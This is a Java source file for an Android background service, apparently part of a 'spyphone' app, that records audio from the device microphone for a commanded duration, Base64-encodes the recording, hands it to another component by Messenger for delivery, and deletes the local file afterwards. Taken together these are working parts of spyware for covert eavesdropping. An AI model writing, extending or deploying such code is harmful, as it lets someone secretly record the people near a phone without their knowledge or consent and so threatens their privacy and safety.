package emit.esy.es.spyphone.services;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import com.firebase.client.utilities.Base64;

import java.io.IOException;

import emit.esy.es.spyphone.interfaces.ServiceResponse;
import emit.esy.es.spyphone.util.IOUtil;

/**
 * Created by Emil Makovac on 07/05/2015.
 */
public class MicrophoneService extends Service implements ServiceResponse {

    public static final String LOG_TAG = "MicrophoneService";
    private final String mFileName;
    private MediaRecorder mRecorder;


    public MicrophoneService() {
        String fnm = Environment.getExternalStorageDirectory().getAbsolutePath();
        mFileName = fnm + "/audiorecordtest.3gp";
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, mFileName);
        long duration = intent.getLongExtra("duration", 0);
        if(duration == 0)
            stopSelf();

        duration *= 1000;
        startRecording();
        Log.d(LOG_TAG, "Going to sleep");
        new CountDownTimer(duration, 1000){

            @Override
            public void onTick(long millisUntilFinished) {

            }

            @Override
            public void onFinish() {
                stopRecording();
                onWorkDone(intent);

            }
        }.start();

        return START_NOT_STICKY;
    }


    private void startRecording() {
        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mRecorder.setOutputFile(mFileName);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            mRecorder.prepare();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

        mRecorder.start();
        Log.d(LOG_TAG, "Recording started");
    }

    private void stopRecording() {
        mRecorder.stop();
        mRecorder.reset();
        mRecorder.release();
        mRecorder = null;
        Log.d(LOG_TAG, "Recording stopped");
    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "onWorkDone");
        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", "mic");
        data.putString("content", getStringFromRecordedAudio(mFileName));
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }
    }

    private String getStringFromRecordedAudio(String mFileName){

        byte[] bytes = new byte[0];
        try {
            bytes = IOUtil.readFile(mFileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String encoded = new String(Base64.encodeBytes(bytes));
        return encoded;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        IOUtil.removeFile(mFileName);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
